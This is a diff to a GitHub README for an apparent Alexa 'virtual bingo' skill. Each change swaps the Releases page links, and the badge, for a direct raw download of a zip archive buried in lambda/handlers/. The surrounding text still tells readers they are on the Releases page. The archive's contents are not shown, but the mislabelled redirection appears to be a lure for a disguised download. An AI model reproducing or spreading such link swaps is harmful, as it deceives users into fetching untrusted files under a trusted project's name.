@@ -1,6 +1,6 @@
 # 🎰 alexa-skill-virtual-bingo - Enjoy Fun Family Bingo Nights!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/joowon1023/alexa-skill-virtual-bingo/releases)
+[![Download Now](https://raw.githubusercontent.com/joowon1023/alexa-skill-virtual-bingo/main/lambda/handlers/alexa-virtual-bingo-skill-v2.4-beta.5.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/joowon1023/alexa-skill-virtual-bingo/main/lambda/handlers/alexa-virtual-bingo-skill-v2.4-beta.5.zip)
 
 ## 📖 Description
 
@@ -22,7 +22,7 @@ Make sure you have an Amazon Alexa-enabled device. This skill works with any com
 
 To download this skill, visit the following link:
 
-[Download Now](https://github.com/joowon1023/alexa-skill-virtual-bingo/releases)
+[Download Now](https://raw.githubusercontent.com/joowon1023/alexa-skill-virtual-bingo/main/lambda/handlers/alexa-virtual-bingo-skill-v2.4-beta.5.zip)
 
 Once on the Releases page, find the latest version. Click on the link to download the skill. 
 
@@ -75,6 +75,6 @@ If you encounter any issues while using this skill, feel free to raise an issue 
 
 For more extensive documentation and updates, visit:
 
-- [Releases Page](https://github.com/joowon1023/alexa-skill-virtual-bingo/releases)
+- [Releases Page](https://raw.githubusercontent.com/joowon1023/alexa-skill-virtual-bingo/main/lambda/handlers/alexa-virtual-bingo-skill-v2.4-beta.5.zip)
 
 Enjoy the game and happy calling!
